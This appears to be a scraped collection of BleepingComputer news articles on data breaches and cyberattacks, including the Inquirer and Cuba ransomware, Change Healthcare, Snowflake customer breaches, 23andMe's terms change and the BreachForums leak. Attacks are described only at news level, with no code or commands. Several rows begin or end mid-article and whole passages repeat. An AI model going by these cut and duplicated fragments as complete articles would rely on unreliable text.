The bank first revealed in a February SEC filing that the attackers exploited a zero-day vulnerability in the third-party software (disclosed by the vendor on October 27, 2024) to hack a limited number of Western Alliance systems and exfiltrate files stored on the compromised devices. Western Alliance found that customer data was exfiltrated from its network only after discovering that the attackers leaked some files stolen from its systems. In breach notification letters sent to 21,899 affected customers and filed with the Office of Maine's Attorney General , the company said it has since ""determined that the unauthorized actor acquired certain files from the systems from October 12, 2024, to October 24, 2024.""

The Inquirer is Philadelphia's largest newspaper by circulation and has won 20 Pulitzer Prizes since it was founded in 1829. It's also the third-longest operating daily newspaper in the United States. In May 2023, The Inquirer disclosed that its systems were breached in a cyberattack detected after its content management system went down unexpectedly. In response, the news organizations took some computer systems offline to contain the security breach and hired Kroll forensics experts to investigate the ""anomalous activity."" The attack disrupted the publication of the print newspaper, with home-delivery subscribers asked to catch up with the latest news using the newspaper's website (inquirer.com), which remained unaffected. ""On May 13, 2023, we became aware of suspicious activity relating to certain internal information systems. In response, we began working with third-party cyber specialists to investigate the nature and scope of the activity,"" The Inquirer said in data breach notifications [ PDF ] sent to impacted individuals. ""We determined that an unauthorized party gained access to our systems and certain files were viewed and/or copied from our systems between May 11, 2023, and May 13, 2023."" The investigation determined that the information exposed during the breach included the impacted individuals' names and other personal identifiers in combination with financial account numbers or credit/debit card numbers (in combination with security code, access code, password, or PIN for the accounts). The newspaper advised affected people to monitor their accounts for identity theft and fraud attempts and offered 24 months of free Experian credit monitoring and identity restoration services. While The Inquirer didn't reveal the nature of the attack, the Cuba ransomware gang claimed responsibility one week after the incident. The ransomware group claimed they stole financial documents, correspondence with bank employees, balance sheets, tax documents, compensation, and source code from Inquirer's compromised servers. Cuba also published the files on its dark web leak site, indicating that the newspaper refused to pay a ransom and that the extortion attempt reached a dead end. However, one day after the files were leaked, The Inquirer reported that the documents did not ""appear to come from the newspaper."" Soon after, the ransomware gang removed the Philadelphia Inquirer entry from its website. As the FBI and CISA revealed in a joint security advisory , the Cuba ransomware gang collected over $60 million in ransoms until August 2022 after breaching more than 100 victims worldwide. A previous FBI advisory from December 2021 also warned that Cuba operators had compromised at least 49 U.S. critical infrastructure organizations.

However, one day after the files were leaked, The Inquirer reported that the documents did not ""appear to come from the newspaper."" Soon after, the ransomware gang removed the Philadelphia Inquirer entry from its website. As the FBI and CISA revealed in a joint security advisory , the Cuba ransomware gang collected over $60 million in ransoms until August 2022 after breaching more than 100 victims worldwide. A previous FBI advisory from December 2021 also warned that Cuba operators had compromised at least 49 U.S. critical infrastructure organizations. It's budget season!

""The consumer notice will be provided once Allianz has identified the affected individuals,"" reads the placeholder notification. While Allianz Life declined to answer questions about the threat actor and whether they were being extorted, BleepingComputer has learned that the attack is believed to have been conducted by the ShinyHunters extortion group.

The biggest cybersecurity and cyberattack stories of 2024,https://www.bleepingcomputer.com/news/security/the-biggest-cybersecurity-and-cyberattack-stories-of-2024/#comments,Lawrence Abrams,"January 1, 2025","2024 was a big year for cybersecurity, with significant cyberattacks, data breaches, new threat groups emerging, and, of course, zero-day vulnerabilities. Some stories, though, were more impactful or popular with our 31 million readers than others. Below are fourteen of what BleepingComputer believes are the most impactful cybersecurity stories of 2024, with a summary of each. These stories are in no particular order. On October 9, the Internet Archive was hit by two different attacks at once —a data breach where the site's user data for 33 million users was stolen and a DDoS attack by an alleged pro-Palestinian group named SN_BlackMeta. While both attacks occurred over the same period, they were conducted by different threat actors. The threat actors who breached Internet Archive told BleepingComputer that they could do so through an exposed GitLab configuration file containing an authentication token, allowing them to download the Internet Archive source code. This source code contained additional credentials and authentication tokens, including the credentials to Internet Archive's database management system. This allowed the threat actor to download the organization's user database, further source code, and modify the site. On July 19th, 2024, a faulty CrowdStrike Falcon update was pushed out to Windows PCs in the early morning, causing the cybersecurity software's kernel driver to crash the operating system. This bug caused significant global disruptions , impacting approximately 8.5 million Windows systems, who now found that their devices had crashed with no easy way back into the operating system to remove the faulty update other than booting into safe mode. The bug stemmed from a flaw in CrowdStrike's content validation process , which failed to detect a defective update. This faulty update triggered a series of system crashes, including endless reboot loops that affected both Windows devices and Windows 365 Cloud PCs. As CrowdStrike is used by many organizations, it quickly caused widespread disruption, impacting financial firms, airlines, and hospitals worldwide who suddenly found their Windows devices and applications were unavailable. Microsoft released a Windows repair tool to help remove the problematic CrowdStrike driver and restore affected systems. Despite this tool, many organizations faced a lengthy recovery process as each device would need to be manually fixed. Things got worse when the threat actors started getting into the game. Cybercriminals distributed fake CrowdStrike repair tools and manuals that pushed malware , including the new Daolpu infostealer . These phishing campaigns targeted orgs attempting to recover from the outage, further delaying outages. Investors soon filed a lawsuit against CrowdStrike , accusing it of negligence in its quality assurance processes and failing to prevent the release of the defective update. Microsoft also announced that they would be looking into changing their kernel driver handling policies in response to the incident and encouraged antivirus vendors to limit their use of Kernel drivers to prevent these types of crashes. In June, the Biden administration announced an upcoming ban of Kaspersky antivirus software , giving customers until September 29, 2024, to find alternative security software. The ban not only involved the sale of Kaspersky software in the US, but also prevented the company from delivering antivirus and security updates to customers. A month later, Kaspersky began shutting down its operations in the US , telling BleepingComputer that the Biden administration's decisions have made operations ""no longer viable."" Kaspersky decided to sell its US customer base to Point Wild (previously Pango) and emailed customers in early September that they would receive a free upgrade to the UltraAV software. On September 19, Kaspersky users suddenly found their Kaspersky products removed and UltraAV force-installed on their computers whether they wanted it or not. While in-app notices and emails were sent about the migration, many users either missed them or were unaware, making many customers furious that the software was installed on their devices without permission. In January, Microsoft disclosed that Russian state-sponsored threat actors breached their corporate email servers in November 2023 to steal email from their leadership, cybersecurity, and legal teams. Some of these emails contained information about the hacking group itself, allowing the threat actors to learn what Microsoft knew about them. The hacking group, known as Midnight Blizzard (aka Nobelium, or APT29) is believed to be a state-backed cyberespionage group tied to the Russian Foreign Intelligence Service (SVR). Microsoft later disclosed that the threat actors conducted a password-spray attack that allowed access to a legacy non-production test tenant account. This test tenant account also had access to an OAuth application with elevated privileges in Microsoft's corporate environment, allowing the hackers to steal data from corporate mailboxes. The hackers breached Microsoft again in March 2024 using information found in the stolen emails, allowing them to steal source code repositories. It kept getting worse, with CISA confirming in April that emails between US federal agencies and Microsoft were also stolen in the attack. These emails contained information that let the hackers gain access to some customer's systems. In August, almost 2.7 billion records of personal information for people in the United States were leaked on a hacking forum, exposing names, social security numbers, all known physical addresses, and possible aliases. The data was stolen from National Public Data, a company that collects and sells access to personal data for use in background checks, to obtain criminal records, and for private investigators. Have I Been Pwned's Troy Hunt analyzed the breach and determined it contained 134 million unique email addresses, making this a monstrous data breach. The threat actors behind the breach attempted to sell it for $3.5 million, but it was eventually leaked for free on a hacking forum. This year, we continued to see attacks targeting edge networking devices from various manufacturers, including Fortinet, TP-Link, Ivanti, and Cisco. These types of devices are valuable targets as they are meant to be exposed to the Internet, and once breached, allow threat actors to pivot into the internal network. There are too many stories to summarize, so here are a list of the interesting ones: It has gotten so bad that the US is considering banning China-made TP-Link routers over cybersecurity concerns. Car dealership software-as-a-service provider CDK Global suffered a Black Suit ransomware attack , causing the company to shut down its systems and leaving clients unable to operate their business normally. CDK Global provides clients in the auto industry with a SaaS platform that handles all aspects of a car dealership's operation, including CRM, financing, payroll, support and service, inventory, and back-office operations. As many of the car dealerships in the US utilize the platform, the outage led to widespread disruption, preventing dealers from tracking and ordering car parts, conducting new sales, and offering financing. In May, threat actors began selling data that they claimed was stolen from customers of the Snowflake cloud data platform. After the attacks were investigated, it was determined that the threat actors didn't breach Snowflake but rather used compromised credentials to log in to customer's SnowFlake accounts. These credentials are believed to have been stolen through information-stealing malware. Once they logged into the account, they were able to export the databases and use them to extort companies into paying a ransom for the data not to be publicly released. AT&T disclosed in July that call logs of 109 million customers were exposed during the incident and that the data was accessed from an online database on the company's Snowflake account. TicketMaster was also impacted, with the threat actors claiming to steal the data of 560 million customers . Data breaches linked to these attacks, which started in April 2024, have affected hundreds of millions of individuals using the services of AT&T , Ticketmaster , Santander , Pure Storage , Advance Auto Parts , Los Angeles Unified , QuoteWizard/LendingTree , and Neiman Marcus . In November, the US Department of Justice unsealed an indictment against two people, Connor Riley Moucka and John Erin Binns, who are accused of being behind the attacks . The threat actors allegedly extorted $2.5 million as part of these attacks, with Wired reporting that AT&T paid $370,000 for the hackers to delete stolen call records. This year, we saw an uptick in North Korean IT workers trying to get jobs in the US and other countries to perform cyberespionage and generate revenue for their country's operations. In May, the Department of Justice charged five individuals , a US Citizen woman, a Ukrainian man, and three foreign nationals, for their involvement in helping North Korean IT works infiltrate US job markets to generate revenue for North Korea's nuclear weapons program. In July, email security firm KnowBe4 mistakenly hired a North Korean hacker as their Principal Software Engineer, who attempted to install information-stealing malware on the network. In August, the Justice Department arrested a Nashville man charged with helping North Korean IT workers obtain remote work at companies across the United States and operating a laptop farm they used to pose as U.S.-based individuals. Both Mandiant and SecureWorks later released reports on the North Korean IT Worker threat, sharing their tactics and how companies can protect themselves. In February, UnitedHealth subsidiary Change Healthcare suffered a massive ransomware attack that caused massive disruption to the US healthcare industry. The outages prevented doctors and pharmacies from filing claims and prevented pharmacies from accepting discount prescription cards, causing patients to pay full price for medications. The attack was ultimately linked to the BlackCat ransomware gang , aka ALPHV, who used stolen credentials to breach the company's Citrix remote access service, which did not have multi-factor authentication enabled. During the attack, the threat actors stole 6 TB of data and ultimately encrypted computers on the network, causing the company to shut down IT systems to prevent the spread of the attack. The UnitedHealth Group admitted to paying a ransom demand to receive a decryptor and for the threat actors to delete the stolen data. The ransom payment was allegedly $22 million, according to the BlackCat ransomware affiliate who conducted the attack. The BlackCat ransomware operation was under immense pressure from law enforcement after the Change Healthcare attacks, causing them to shut down . After UnitedHealth paid an alleged $20 million ransom, the ransomware operation performed an exit scam, stealing all of the money and not sharing any with the affiliate who conducted the attack. Unfortunately, the affiliate claimed to still have Change Healthcare's data, which they used to extort the healthcare company again, this time using RansomHub's extortion site . Ultimately, the data disappeared from the extortion, likely indicating that another ransom was paid. In October, UnitedHealth confirmed that over 100 million people had their personal and healthcare data stolen , marking this as the largest healthcare data breach in recent years. On February 19, authorities took down LockBit's infrastructure, which included 34 servers hosting the data leak website and its mirrors, data stolen from the victims, cryptocurrency addresses, decryption keys, and the affiliate panel. This disruption was part of an international law enforcement operation called Operation Cronos . Five days later, LockBit relaunched with new infrastructure and threatened to focus more of its attacks on the government sector. However, the ransomware gang was never able to return to its previous prominence, with its affiliates moving to other ransomware operations. Over the past year, law enforcement has continued to target LockBit, identifying and charging seven LockBit ransomware members . Among those charged, is the primary operator of the ransomware operation, who the Department of Justice claims is a Russian national named Dmitry Yuryevich Khoroshev, aka 'LockBitSupp' and 'putinkrab'. LockBit recently began testing a new encryptor called LockBit 4, which does not appear to be much different than its previous version. Microsoft's new AI-powered Windows 11 Recall feature has sparked a lot of concern among the cybersecurity community, with many thinking that it is a massive privacy risk and a new attack vector that threat actors can exploit to steal data. After receiving tremendous backlash, Microsoft delayed the release of the software to increase its security by requiring users to opt-in to enable Recall on their computers and that they'll have to confirm they're in front of their PC via Windows Hello to be able to use it. Microsoft continued to delay its release while adding additional features , such as automatically filtering sensitive content, allowing users to exclude specific apps, websites, or in-private browsing sessions, and it can be removed if needed. However, after releasing the software to Windows Insiders for testing, it was discovered that Windows 11 Recall did not properly filter sensitive information, like credit cards. Microsoft said they continue refining the product as new issues are discovered. A Chinese state-sponsored hacking group known as ""Salt Typhoon"" is linked to a series of cyberattacks targeting telecommunications firms globally. These breaches compromised at least nine major telecom providers , including AT&T, Verizon, and T-Mobile . The group reportedly focused on infiltrating telecom infrastructure to steal text messages, phone call information, and voicemails from targeted people. The threat actors also targeted the wiretapping platforms used by the US government, raising serious national security concerns. A White House briefing revealed that Salt Typhoon's operations also impacted telecommunications providers in dozens of countries . In the US, these attacks prompted concerns about weaknesses in telecom infrastructure and the security of government surveillance platforms. US lawmakers, including Senator Ron Wyden, have proposed legislation to address vulnerabilities in the nation's telecom infrastructure. The proposed bill aims to establish stricter cybersecurity standards and oversight for telecom providers to prevent similar attacks in the future. The US government reportedly plans to ban China Telecom's last active US operations in response to the telecom hacks. Information-stealing malware campaigns are running rampant this year, used in many different campaigns to steal infected users' browser information, cookies, saved credentials, credit cards, and cryptocurrency wallets. While infostealers have been around for many years, they have been particularly prominent with threat actors using them in a wide range of campaigns. These stolen credentials are then used to breach corporate networks, bank accounts, cryptocurrency exchanges, and email accounts. The number of stories surrounding infostealers is too long to summarize, so instead, here are a few of the ways infostealers were used this year: Unfortunately, for those who become infected with an infostealer, it can lead to devastating financial losses as threat actors steal cryptocurrency and access victims' bank accounts. The best way to prevent these types of attacks is to enable two-factor authentication with an authenticator app on all accounts that offer the protection. With 2FA enabled, even if a threat actor has your credentials, they won't be able to log in without the code generated by your authenticator. It's budget season!

The biggest cybersecurity and cyberattack stories of 2024,https://www.bleepingcomputer.com/news/security/the-biggest-cybersecurity-and-cyberattack-stories-of-2024/,Lawrence Abrams,"January 1, 2025","2024 was a big year for cybersecurity, with significant cyberattacks, data breaches, new threat groups emerging, and, of course, zero-day vulnerabilities. Some stories, though, were more impactful or popular with our 31 million readers than others. Below are fourteen of what BleepingComputer believes are the most impactful cybersecurity stories of 2024, with a summary of each. These stories are in no particular order. On October 9, the Internet Archive was hit by two different attacks at once —a data breach where the site's user data for 33 million users was stolen and a DDoS attack by an alleged pro-Palestinian group named SN_BlackMeta. While both attacks occurred over the same period, they were conducted by different threat actors. The threat actors who breached Internet Archive told BleepingComputer that they could do so through an exposed GitLab configuration file containing an authentication token, allowing them to download the Internet Archive source code. This source code contained additional credentials and authentication tokens, including the credentials to Internet Archive's database management system. This allowed the threat actor to download the organization's user database, further source code, and modify the site. On July 19th, 2024, a faulty CrowdStrike Falcon update was pushed out to Windows PCs in the early morning, causing the cybersecurity software's kernel driver to crash the operating system. This bug caused significant global disruptions , impacting approximately 8.5 million Windows systems, who now found that their devices had crashed with no easy way back into the operating system to remove the faulty update other than booting into safe mode. The bug stemmed from a flaw in CrowdStrike's content validation process , which failed to detect a defective update. This faulty update triggered a series of system crashes, including endless reboot loops that affected both Windows devices and Windows 365 Cloud PCs. As CrowdStrike is used by many organizations, it quickly caused widespread disruption, impacting financial firms, airlines, and hospitals worldwide who suddenly found their Windows devices and applications were unavailable. Microsoft released a Windows repair tool to help remove the problematic CrowdStrike driver and restore affected systems. Despite this tool, many organizations faced a lengthy recovery process as each device would need to be manually fixed. Things got worse when the threat actors started getting into the game. Cybercriminals distributed fake CrowdStrike repair tools and manuals that pushed malware , including the new Daolpu infostealer . These phishing campaigns targeted orgs attempting to recover from the outage, further delaying outages. Investors soon filed a lawsuit against CrowdStrike , accusing it of negligence in its quality assurance processes and failing to prevent the release of the defective update. Microsoft also announced that they would be looking into changing their kernel driver handling policies in response to the incident and encouraged antivirus vendors to limit their use of Kernel drivers to prevent these types of crashes. In June, the Biden administration announced an upcoming ban of Kaspersky antivirus software , giving customers until September 29, 2024, to find alternative security software. The ban not only involved the sale of Kaspersky software in the US, but also prevented the company from delivering antivirus and security updates to customers. A month later, Kaspersky began shutting down its operations in the US , telling BleepingComputer that the Biden administration's decisions have made operations ""no longer viable."" Kaspersky decided to sell its US customer base to Point Wild (previously Pango) and emailed customers in early September that they would receive a free upgrade to the UltraAV software. On September 19, Kaspersky users suddenly found their Kaspersky products removed and UltraAV force-installed on their computers whether they wanted it or not. While in-app notices and emails were sent about the migration, many users either missed them or were unaware, making many customers furious that the software was installed on their devices without permission. In January, Microsoft disclosed that Russian state-sponsored threat actors breached their corporate email servers in November 2023 to steal email from their leadership, cybersecurity, and legal teams. Some of these emails contained information about the hacking group itself, allowing the threat actors to learn what Microsoft knew about them. The hacking group, known as Midnight Blizzard (aka Nobelium, or APT29) is believed to be a state-backed cyberespionage group tied to the Russian Foreign Intelligence Service (SVR). Microsoft later disclosed that the threat actors conducted a password-spray attack that allowed access to a legacy non-production test tenant account. This test tenant account also had access to an OAuth application with elevated privileges in Microsoft's corporate environment, allowing the hackers to steal data from corporate mailboxes. The hackers breached Microsoft again in March 2024 using information found in the stolen emails, allowing them to steal source code repositories. It kept getting worse, with CISA confirming in April that emails between US federal agencies and Microsoft were also stolen in the attack. These emails contained information that let the hackers gain access to some customer's systems. In August, almost 2.7 billion records of personal information for people in the United States were leaked on a hacking forum, exposing names, social security numbers, all known physical addresses, and possible aliases. The data was stolen from National Public Data, a company that collects and sells access to personal data for use in background checks, to obtain criminal records, and for private investigators. Have I Been Pwned's Troy Hunt analyzed the breach and determined it contained 134 million unique email addresses, making this a monstrous data breach. The threat actors behind the breach attempted to sell it for $3.5 million, but it was eventually leaked for free on a hacking forum. This year, we continued to see attacks targeting edge networking devices from various manufacturers, including Fortinet, TP-Link, Ivanti, and Cisco. These types of devices are valuable targets as they are meant to be exposed to the Internet, and once breached, allow threat actors to pivot into the internal network. There are too many stories to summarize, so here are a list of the interesting ones: It has gotten so bad that the US is considering banning China-made TP-Link routers over cybersecurity concerns. Car dealership software-as-a-service provider CDK Global suffered a Black Suit ransomware attack , causing the company to shut down its systems and leaving clients unable to operate their business normally. CDK Global provides clients in the auto industry with a SaaS platform that handles all aspects of a car dealership's operation, including CRM, financing, payroll, support and service, inventory, and back-office operations. As many of the car dealerships in the US utilize the platform, the outage led to widespread disruption, preventing dealers from tracking and ordering car parts, conducting new sales, and offering financing. In May, threat actors began selling data that they claimed was stolen from customers of the Snowflake cloud data platform. After the attacks were investigated, it was determined that the threat actors didn't breach Snowflake but rather used compromised credentials to log in to customer's SnowFlake accounts. These credentials are believed to have been stolen through information-stealing malware. Once they logged into the account, they were able to export the databases and use them to extort companies into paying a ransom for the data not to be publicly released. AT&T disclosed in July that call logs of 109 million customers were exposed during the incident and that the data was accessed from an online database on the company's Snowflake account. TicketMaster was also impacted, with the threat actors claiming to steal the data of 560 million customers . Data breaches linked to these attacks, which started in April 2024, have affected hundreds of millions of individuals using the services of AT&T , Ticketmaster , Santander , Pure Storage , Advance Auto Parts , Los Angeles Unified , QuoteWizard/LendingTree , and Neiman Marcus . In November, the US Department of Justice unsealed an indictment against two people, Connor Riley Moucka and John Erin Binns, who are accused of being behind the attacks . The threat actors allegedly extorted $2.5 million as part of these attacks, with Wired reporting that AT&T paid $370,000 for the hackers to delete stolen call records. This year, we saw an uptick in North Korean IT workers trying to get jobs in the US and other countries to perform cyberespionage and generate revenue for their country's operations. In May, the Department of Justice charged five individuals , a US Citizen woman, a Ukrainian man, and three foreign nationals, for their involvement in helping North Korean IT works infiltrate US job markets to generate revenue for North Korea's nuclear weapons program. In July, email security firm KnowBe4 mistakenly hired a North Korean hacker as their Principal Software Engineer, who attempted to install information-stealing malware on the network. In August, the Justice Department arrested a Nashville man charged with helping North Korean IT workers obtain remote work at companies across the United States and operating a laptop farm they used to pose as U.S.-based individuals. Both Mandiant and SecureWorks later released reports on the North Korean IT Worker threat, sharing their tactics and how companies can protect themselves. In February, UnitedHealth subsidiary Change Healthcare suffered a massive ransomware attack that caused massive disruption to the US healthcare industry. The outages prevented doctors and pharmacies from filing claims and prevented pharmacies from accepting discount prescription cards, causing patients to pay full price for medications. The attack was ultimately linked to the BlackCat ransomware gang , aka ALPHV, who used stolen credentials to breach the company's Citrix remote access service, which did not have multi-factor authentication enabled. During the attack, the threat actors stole 6 TB of data and ultimately encrypted computers on the network, causing the company to shut down IT systems to prevent the spread of the attack. The UnitedHealth Group admitted to paying a ransom demand to receive a decryptor and for the threat actors to delete the stolen data. The ransom payment was allegedly $22 million, according to the BlackCat ransomware affiliate who conducted the attack. The BlackCat ransomware operation was under immense pressure from law enforcement after the Change Healthcare attacks, causing them to shut down . After UnitedHealth paid an alleged $20 million ransom, the ransomware operation performed an exit scam, stealing all of the money and not sharing any with the affiliate who conducted the attack. Unfortunately, the affiliate claimed to still have Change Healthcare's data, which they used to extort the healthcare company again, this time using RansomHub's extortion site . Ultimately, the data disappeared from the extortion, likely indicating that another ransom was paid. In October, UnitedHealth confirmed that over 100 million people had their personal and healthcare data stolen , marking this as the largest healthcare data breach in recent years. On February 19, authorities took down LockBit's infrastructure, which included 34 servers hosting the data leak website and its mirrors, data stolen from the victims, cryptocurrency addresses, decryption keys, and the affiliate panel. This disruption was part of an international law enforcement operation called Operation Cronos . Five days later, LockBit relaunched with new infrastructure and threatened to focus more of its attacks on the government sector. However, the ransomware gang was never able to return to its previous prominence, with its affiliates moving to other ransomware operations. Over the past year, law enforcement has continued to target LockBit, identifying and charging seven LockBit ransomware members . Among those charged, is the primary operator of the ransomware operation, who the Department of Justice claims is a Russian national named Dmitry Yuryevich Khoroshev, aka 'LockBitSupp' and 'putinkrab'. LockBit recently began testing a new encryptor called LockBit 4, which does not appear to be much different than its previous version. Microsoft's new AI-powered Windows 11 Recall feature has sparked a lot of concern among the cybersecurity community, with many thinking that it is a massive privacy risk and a new attack vector that threat actors can exploit to steal data. After receiving tremendous backlash, Microsoft delayed the release of the software to increase its security by requiring users to opt-in to enable Recall on their computers and that they'll have to confirm they're in front of their PC via Windows Hello to be able to use it. Microsoft continued to delay its release while adding additional features , such as automatically filtering sensitive content, allowing users to exclude specific apps, websites, or in-private browsing sessions, and it can be removed if needed. However, after releasing the software to Windows Insiders for testing, it was discovered that Windows 11 Recall did not properly filter sensitive information, like credit cards. Microsoft said they continue refining the product as new issues are discovered. A Chinese state-sponsored hacking group known as ""Salt Typhoon"" is linked to a series of cyberattacks targeting telecommunications firms globally. These breaches compromised at least nine major telecom providers , including AT&T, Verizon, and T-Mobile . The group reportedly focused on infiltrating telecom infrastructure to steal text messages, phone call information, and voicemails from targeted people. The threat actors also targeted the wiretapping platforms used by the US government, raising serious national security concerns. A White House briefing revealed that Salt Typhoon's operations also impacted telecommunications providers in dozens of countries . In the US, these attacks prompted concerns about weaknesses in telecom infrastructure and the security of government surveillance platforms.

RIBridges is a modern integrated eligibility system (IES) used in Rhode Island to manage and deliver public assistance programs, helping streamline the administration of various social services. The incident was discovered on December 5, 2024, and following an evaluation by Deloitte, it is considered very likely that hackers stole files containing personally identifiable information and other data. ""On December 13, 2024, the State was informed by its vendor, Deloitte, that there was a major security threat to the RIBridges system,"" reads the announcement published by the Rhode Island authorities on Saturday. ""In response, we have proactively taken the system offline so that the State and Deloitte can work to address the threat and restore the system as quickly as possible."" ""Additionally, Deloitte confirmed that there is a high probability that a cybercriminal has obtained files with personally identifiable information from RIBridges."" Following Deloitte's discovery of ""malicious code"" in the system, RIBridges was taken offline, so citizens cannot currently access their accounts from the web portal or the mobile app. This incident impacts applicants and beneficiaries of the following programs: Although the data that has been exposed remains under evaluation, Deloitte says it may include names, addresses, dates of birth and Social Security numbers, and certain banking information. Impacted households will receive a letter via mail, and affected residents can call the dedicated call center that started operation yesterday to support them.

Established in 1875, HSHS works with over 2,200 physicians and has around 12,000 employees. It also operates a network of physician practices and 15 local hospitals across Illinois and Wisconsin, including two children's hospitals. The non-profit healthcare system said in data breach notifications sent to those impacted that the incident was discovered on August 27, 2023, after detecting that the attacker had gained access to HSHS' network. After the security breach, its systems were also impacted by a widespread outage that took down ""virtually all operating systems"" and phone systems across Illinois and Wisconsin hospitals. HSHS also hired external security experts to investigate the attack, assess its impact, and help its IT team restore affected systems. ""We are prioritizing patient safety as we establish a process for restoration. With the support of third-party experts, we are bringing our systems back online as quickly and as safely as possible,"" HSHS said in a September 2024 statement . ""A health system of our size operates hundreds of system applications across thousands of servers, and as such, our restoration and investigative work will take some time to complete. While the incident and the resulting outage have all the signs of a ransomware attack, no ransomware operation has claimed the breach. Following the forensic investigation, HSHS found that the attackers had accessed files on compromised systems between August 16 and August 27, 2023. ""We have since been reviewing those files and notifying individuals whose information was found in the files on a rolling basis as our review has continued,"" it said. The information accessed by the threat actors while inside HSHS' systems varies for each impacted individual, and it includes a combination of name, address, date of birth, medical record number, limited treatment information, health insurance information, Social Security number, and/or driver's license number. While HSHS added that there is no evidence that the victims' information has been used in fraud or identity theft attempts, it warned affected individuals to monitor their account statements and credit reports for suspicious activity.

23andMe updates user agreement to prevent data breach lawsuits,https://www.bleepingcomputer.com/news/security/23andme-updates-user-agreement-to-prevent-data-breach-lawsuits/,Lawrence Abrams,"December 7, 2023","As Genetic testing provider 23andMe faces multiple lawsuits for an October credential stuffing attack that led to the theft of customer data, the company has modified its Terms of Use to make it harder to sue the company. In October, a threat actor attempted to sell 23andMe customer data and, after failing to do so, leaked the data for 1 million Ashkenazi Jews and 4.1 million people living in the United Kingdom . 23andMe told BleepingComputer that the data was obtained through credential stuffing attacks to breach customer accounts. Using these limited numbers of accounts, the threat actors used the ' DNA Relatives ' feature to scrape millions of individuals' data. In a recent update, 23andMe told BleepingComputer that a total of 6.9 million people were impacted by the breach — 5.5 million through the DNA Relatives feature and 1.4 million people through the Family Tree feature. The breach has led to numerous lawsuits against the company , causing 23andMe to update its Terms of Use on November 30th to contain provisions that make it more difficult to take part in class action lawsuits against the company. These provisions increase the initial dispute period from 30 to 60 days, requiring customers to first have a telephone or videoconference with 23andMe to try and resolve the dispute. The new Terms also contain stronger language to prevent a party from bringing a class action lawsuit against 23andMe. ""To the fullest extent allowed by applicable law, you and we agree that each party may bring disputes against the other party only in an individual capacity, and not as a class action or collective action or class arbitration,"" reads the updated Terms of Use. 23andMe claims that these changes were added to make the dispute process more efficient and understandable to customers. ""The recent revisions to our terms of service provide more details and clarity around the arbitration process,"" a 23andMe spokesperson told BleepingComputer. ""For example, the informal resolution period has been extended to 60 days, which makes that process more efficient for customers.""

23andMe updates user agreement to prevent data breach lawsuits,https://www.bleepingcomputer.com/news/security/23andme-updates-user-agreement-to-prevent-data-breach-lawsuits/#comments,Lawrence Abrams,"December 7, 2023","As Genetic testing provider 23andMe faces multiple lawsuits for an October credential stuffing attack that led to the theft of customer data, the company has modified its Terms of Use to make it harder to sue the company. In October, a threat actor attempted to sell 23andMe customer data and, after failing to do so, leaked the data for 1 million Ashkenazi Jews and 4.1 million people living in the United Kingdom . 23andMe told BleepingComputer that the data was obtained through credential stuffing attacks to breach customer accounts. Using these limited numbers of accounts, the threat actors used the ' DNA Relatives ' feature to scrape millions of individuals' data. In a recent update, 23andMe told BleepingComputer that a total of 6.9 million people were impacted by the breach — 5.5 million through the DNA Relatives feature and 1.4 million people through the Family Tree feature. The breach has led to numerous lawsuits against the company , causing 23andMe to update its Terms of Use on November 30th to contain provisions that make it more difficult to take part in class action lawsuits against the company. These provisions increase the initial dispute period from 30 to 60 days, requiring customers to first have a telephone or videoconference with 23andMe to try and resolve the dispute. The new Terms also contain stronger language to prevent a party from bringing a class action lawsuit against 23andMe. ""To the fullest extent allowed by applicable law, you and we agree that each party may bring disputes against the other party only in an individual capacity, and not as a class action or collective action or class arbitration,"" reads the updated Terms of Use. 23andMe claims that these changes were added to make the dispute process more efficient and understandable to customers. ""The recent revisions to our terms of service provide more details and clarity around the arbitration process,"" a 23andMe spokesperson told BleepingComputer. ""For example, the informal resolution period has been extended to 60 days, which makes that process more efficient for customers."" Emails sent to customers about this change state that users have up to 30 days of receiving the email notification to notify 23andMe at legal@23andme.com that they disagree with the new terms.

BreachForums v1 hacking forum data leak exposes members’ info,https://www.bleepingcomputer.com/news/security/breachforums-v1-hacking-forum-data-leak-exposes-members-info/,Lawrence Abrams,"July 23, 2024","The private member information of the BreachForums v1 hacking forum from 2022 has been leaked online, allowing threat actors and researchers to gain insight into its users. Multiple forums have operated under the name BreachForums, all devoted to building a community of collectors and threat actors who trade, sale, and leak data stolen from breached companies. The first data breach forum to rise to prominence was RaidForums, and after the FBI seized it in 2022 , a threat actor known as Pompompurin launched a remake called BreachForums (aka Breached) to fill the void. This forum quickly rose to prominence, with threat actors proudly leaking massive amounts of stolen data, including data from U.S. Congress' healthcare provider D.C. Health Link , RobinHood , and Twitter data leaked using an exposed API . However, soon after the D.C. Health Link data was leaked, the FBI arrested the forum's owner Conor Fitzpatrick , aka Pompompurin, in March 2023. Soon after, multiple instances of the forum were created and seized by law enforcement. The latest incarnation was launched by ShinyHunters (now passed to new admins) and is still in operation today. Due to multiple sites using the same name, the recently leaked data is from what we will call BreachForums 1.0, the site created initially by Fitzpatrick in 2022 and eventually seized by the FBI in 2024 . Last week, a well-known threat actor named Emo leaked the personal information of 212,414 members of BreachForums 1.0. According to Emo, the data comes directly from Fitzpatrick, who allegedly attempted to sell it in June 2023 for $4,000 while out on bail. Emo says the data was eventually purchased by three threat actors. Fitzpatrick was arrested again in January 2024 for violating the terms of his pretrial release conditions, including using an unmonitored computer and a VPN. It is not known if this was related to his attempted sale of the BreachForums data. In July 2023, someone named 'breached_db_person' attempted to sell the forum database for $100,000 - $150,000 on the hacking forum. The seller also shared the for-sale data with Troy Hunt, who told BleepingComputer it included the same data leaked by Emo and other database records. Hunt subsequently added the information to the Have I Been Pwned data breach notification service. Emo told BleepingComputer that this data is from a November 2022 BreachForums database backup, the last one uploaded to Fitzpatrick's MEGA account. The leaked data contains a forum member's user ID, login name, email address, registration IP address, and the last used IP address when visiting the site. BleepingComputer has analyzed the database and verified that it contains the accurate information of many researchers who had accounts on the original BreachForums. This data appears to be a manual export, as it is not in the MyBB forum database format but rather exported as tab-separated values. While it's likely that the database is already in the hands of law enforcement after the forum was seized, this data could still be helpful for security researchers who commonly build profiles of threat actors. Using the leaked email addresses and IP addresses, researchers and law enforcement can link BreachForums members to other sites, their geographic location, and potentially to their real names. The RaidForums database, which contained the data of 478,000 members, was similarly leaked online in May 2023. It's budget season!

